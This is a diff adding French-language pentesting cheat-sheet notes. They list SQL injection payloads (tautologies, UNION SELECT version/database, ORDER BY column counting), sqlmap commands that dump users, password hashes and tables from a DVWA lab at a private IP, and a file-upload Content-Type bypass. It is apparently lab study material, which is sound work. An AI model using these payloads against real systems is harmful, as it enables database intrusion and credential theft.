@@ -144,10 +144,52 @@
       Inection XSS : 
         xsshunter https://github.com/mandatoryprogrammer/xsshunter-express
         Beef autopown (https://github.com/beefproject/beef/wiki/Autorun-Rule-Engine)
+        
       Injections SQL
-        SQLMAP
-      Cheatsheet https://portswigger.net/web-security/sql-injection/cheat-sheet
+        1' or 1=1; --  (pour obtenir tout les records dans la table)
+        ' OR 1=1 #
+        1' OR '1'='1'# (pour obtenir tout les records dans la table)
        
+        Si le #, 99% de chance que le DBMS soit MySQL
+        Si# ok:
+        %' or 0=0 union select null, version() # ( connaitre la version de database) ou 1' OR 1=1 UNION SELECT 1, VERSION()#
+        1' OR 1=1 UNION SELECT 1,DATABASE() # (connaitre le nom de la DB)
+        Utiliser order by pour connaitre le nombre de champ:
+            1' ORDER BY 1 #
+            1' ORDER BY 2 # etc jusqu'a avoir l'erreur
+            Si erreur à 3 = 2champs
+            Si erreur à 4 = 3champs etc
+        
+        SQLMAP
+        sqlmap -u "http://192.168.46.141/DVWA-master/vulnerabilities/sqli/?id=3&Submit=Submit#" --cookie="PHPSESSID=2t7bspc6qpiu7c1ls66pp0fr34; security=low" --dbs --banner --current-user --current-db --passwords --users
+          --dbs pour extraire le nom des tables
+          --banner extrait la version de la db
+          --current-user extrait le user connecté au SGBD
+          --current-db la database actuellement utilisée
+          --passwords obtient les mdp de la db
+          --users affiche les utilisateurs de la db
+
+        sqlmap -u "http://192.168.46.141/DVWA-master/vulnerabilities/sqli/?id=3&Submit=Submit#" --cookie="PHPSESSID=2t7bspc6qpiu7c1ls66pp0fr34; security=low" --tables -D dvwa
+          -D dvwa pour selectionner la base de données
+          --tables pour afficher les tables dans cette base
+
+        sqlmap -u "http://192.168.46.141/DVWA-master/vulnerabilities/sqli/?id=3&Submit=Submit#" --cookie="PHPSESSID=2t7bspc6qpiu7c1ls66pp0fr34; security=low" -p id -T users --batch --threads 5 –dump
+          -p correspond au parameter id que l’on va enumerer
+          -T dans la table users
+          --batch en mode non interactive
+          -threads 5 nombre de threads
+          --dump pour dumper le contenu de la table
+
+        https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap CHEATSHEET EXPLICATIVE !!!
+        Cheatsheet https://portswigger.net/web-security/sql-injection/cheat-sheet
+        https://book.hacktricks.xyz/pentesting-web/sql-injection
+
+       File upload en jpg/png :
+         modifier Content-type vers /image/png
+         https://wargame.braincoke.fr/labs/dvwa/dvwa-file-upload/
+         tout les content type : https://inkplant.com/code/content-type-headers
+
+        
 
 #[SHELL / REVERSE SHELL]
 
@@ -190,6 +232,9 @@ https://github.com/flozz/p0wny-shell
 
     MD5 Decrypt
       https://www.dcode.fr/md5-hash
+
+    Hash identifier
+      https://hashes.com/en/tools/hash_identifier
 
     Générateur d'incident cyber 
       https://github.com/mrwadams/attackgen
